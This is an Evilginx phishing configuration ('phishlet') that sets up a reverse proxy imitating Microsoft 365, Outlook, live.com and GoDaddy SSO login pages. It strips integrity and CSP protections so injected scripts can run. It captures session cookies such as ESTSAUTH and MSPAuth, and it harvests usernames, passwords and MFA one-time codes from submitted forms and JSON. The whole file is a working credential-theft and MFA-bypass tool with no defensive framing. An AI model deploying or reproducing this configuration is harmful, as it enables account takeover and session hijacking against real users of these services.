min_ver: '3.0.0'
author: '0fukuAkz'
proxy_hosts:
  # Microsoft primary auth
  - {phish_sub: 'api', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'loginw', orig_sub: 'login', domain: 'windows.net', session: true, is_landing: false, auto_filter: true}

  # Office apps
  - {phish_sub: 'outlook365', orig_sub: 'outlook', domain: 'office365.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'products', orig_sub: 'products', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'res', orig_sub: 'res', domain: 'office.com', session: false, is_landing: false, auto_filter: true}

  # Consumer (MSA) / live.com
  - {phish_sub: 'loginlive', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'outlooklive', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false, auto_filter: true}

  # Microsoft CDNs
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'aadcdnalt', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'aadcdnimg', orig_sub: 'aadcdn', domain: 'msauthimages.net', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'lgincdn', orig_sub: 'logincdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}

  - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "sso", orig_sub: "sso", domain: "secureserver.net", session: true, is_landing: false, auto_filter: true  }
  - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
  # ADFS / generic federation (wildcard) — disabled: domain: '*' is unsupported, exact string match only
  #- {phish_sub: 'adfs', orig_sub: 'adfs', domain: '*', session: true, is_landing: false, auto_filter: true}
  #- {phish_sub: 'fs', orig_sub: 'fs', domain: '*', session: true, is_landing: false, auto_filter: true}
  #- {phish_sub: 'sts', orig_sub: 'sts', domain: '*', session: true, is_landing: false, auto_filter: true}

sub_filters:
  # Strip SRI integrity hashes — auto_filter modifies CDN JS content, breaking the hash
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
  # Strip CSP nonce attributes — proxy strips CSP header so nonces are unnecessary and can block injected scripts
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
  # Same for login.live.com consumer pages
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
  # From login.microsoftonline.com — rewrite every known proxied origin
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'windows.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'outlook', domain: 'office365.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'outlook', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msauthimages.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  # From aadcdn.msftauth.net — CDN scripts may reference login
  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'login', domain: 'windows.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/javascript', 'text/javascript', 'application/x-javascript']}

  # From www.office.com — Office Home redirects through login/live
  - {triggers_on: 'www.office.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.office.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.office.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.office.com', orig_sub: 'outlook', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}

  # From outlook.office.com — OWA references
  - {triggers_on: 'outlook.office.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'outlook.office.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}

  # From login.live.com — consumer flow self + back-links
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}

  # ADFS / fs / sts federation passthroughs — disabled: triggers_on wildcard never matches
  #- {triggers_on: 'adfs.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  #- {triggers_on: 'fs.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  #- {triggers_on: 'sts.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

  # From godaddy.com / secureserver.net — SSO passthroughs
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/fp', replace: 'href="https://{hostname}/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/fp', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '{domain}', replace: '{domain}', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}
  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "text/plain"]}

auth_tokens:
  # Microsoft primary auth cookies
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT,opt', 'SignInStateCookie,opt', 'buid,opt', 'esctx,opt', 'fpc,opt', 'stsservicecookie,opt', 'x-ms-gateway-slice,opt', 'ch,opt']
    type: 'cookie'

  - domain: '.login.windows.net'
    keys: ['ESTSAUTH,opt', 'ESTSAUTHPERSISTENT,opt']
    type: 'cookie'

  - domain: '.microsoftonline.com'
    keys: ['buid,opt', 'esctx,opt', 'SignInStateCookie,opt', 'AADSSO,opt', 'SSOCOOKIEPULLED,opt', 'CCState,opt']
    type: 'cookie'

  # Office 365 session cookies
  - domain: '.office365.com'
    keys: ['OIDC,opt', 'RPSAuth,opt', 'RPSSecAuth,opt', 'UserIndex,opt', 'MUID,opt']
    type: 'cookie'

  - domain: '.office.com'
    keys: ['OIDC,opt', 'RPSAuth,opt', 'RPSSecAuth,opt', 'MUID,opt', 'MC1,opt', 'MSCC,opt', 'OH.SID,opt', 'OH.FLID,opt']
    type: 'cookie'

  - domain: '.outlook.office365.com'
    keys: ['OutlookSession,opt', 'UC,opt', 'X-OWA-CANARY,opt', 'ClientId,opt', 'RPSAuth,opt', 'RPSSecAuth,opt']
    type: 'cookie'

  # Live.com consumer auth
  - domain: '.login.live.com'
    keys: ['MSPAUTH,opt', 'MSPAuth,opt', 'MSPProf,opt', 'MSPRequ,opt', 'MSPCID,opt', 'RPSSecAuth,opt', 'MSPBack,opt', 'MSPPre,opt', 'WLSSC,opt', 'SDIDC,opt', 'RpsContextCookie,opt']
    type: 'cookie'

  - domain: '.live.com'
    keys: ['PPLState,opt', 'NAP,opt', 'ANON,opt', 'OParams,opt']
    type: 'cookie'

  # ADFS (federated tenants using native ADFS)
  - domain: 'adfs.*'
    keys: ['MSISAuth,opt', 'MSISAuthenticated,opt', 'MSISSignOut,opt', 'MSISLoopDetectionCookie,opt', 'MSISAuth1,opt', 'MSISAuth2,opt']
    type: 'cookie'

  - domain: 'fs.*'
    keys: ['MSISAuth,opt', 'MSISAuthenticated,opt', 'MSISSignOut,opt', 'MSISLoopDetectionCookie,opt']
    type: 'cookie'

  - domain: 'sts.*'
    keys: ['MSISAuth,opt', 'MSISAuthenticated,opt', 'MSISSignOut,opt', 'MSISLoopDetectionCookie,opt']
    type: 'cookie'

credentials:
  username:
    key: "(login|UserName|username|email|account|DomainUser)"
    search: '(.*)'
    type: 'post'
  password:
    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD|passwordInput)"
    search: '(.*)'
    type: 'post'

  custom:
    # Alternative Microsoft field
    - {key: 'login', search: '(.*)', type: 'post'}
    # Consumer / MSA
    - {key: 'username', search: '(.*)', type: 'post'}
    - {key: 'password', search: '(.*)', type: 'post'}
    # ADFS
    - {key: 'UserName', search: '(.*)', type: 'post'}
    - {key: 'Password', search: '(.*)', type: 'post'}
    # MFA / OTP codes
    - {key: 'otc', search: '(.*)', type: 'post'}
    - {key: 'code', search: '(.*)', type: 'post'}
    - {key: 'otp', search: '(.*)', type: 'post'}
    - {key: 'pin', search: '(.*)', type: 'post'}
    - key: 'mfaAuthMethod'
      search: '(.*)'
      type: 'post'
    - key: '"username"'
      search: '"username":"([^"]*)'
      type: 'json'
    - key: 'email'
      search: '"email":"([^"]*)'
      type: 'json'
    - key: 'email_address'
      search: '"email_address":"([^"]*)'
      type: 'json'
    - key: 'account'
      search: '"account":"([^"]*)'
      type: 'json'
    - key: 'user_id'
      search: '"user_id":"([^"]*)'
      type: 'json'
    - key: 'login'
      search: '"login":"([^"]*)'
      type: 'json'
    - key: 'identifier'
      search: '"identifier":"([^"]*)'
      type: 'json'
    - key: 'loginId'
      search: '"loginId":"([^"]*)'
      type: 'json'
    - key: 'password'
      search: '"password":"([^"]*)'
      type: 'json'
    - key: 'pass'
      search: '"pass":"([^"]*)'
      type: 'json'
    - key: 'pwd'
      search: '"pwd":"([^"]*)'
      type: 'json'
    - key: 'Passwd'
      search: '"Passwd":"([^"]*)'
      type: 'json'
    - key: 'session_password'
      search: '"session_password":"([^"]*)'
      type: 'json'
    - key: 'access_key'
      search: '"access_key":"([^"]*)'
      type: 'json'
    - key: 'secretKey'
      search: '"secretKey":"([^"]*)'
      type: 'json'
    - key: 'passcode'
      search: '"passcode":"([^"]*)'
      type: 'json'

auth_urls:
  # Microsoft completion endpoints
  - '/kmsi'
  - '/landingv2'
  - '/ppsecure/post.srf'
  - '/GetSessionState'


login:
  domain: 'login.microsoftonline.com'
  path: '/'

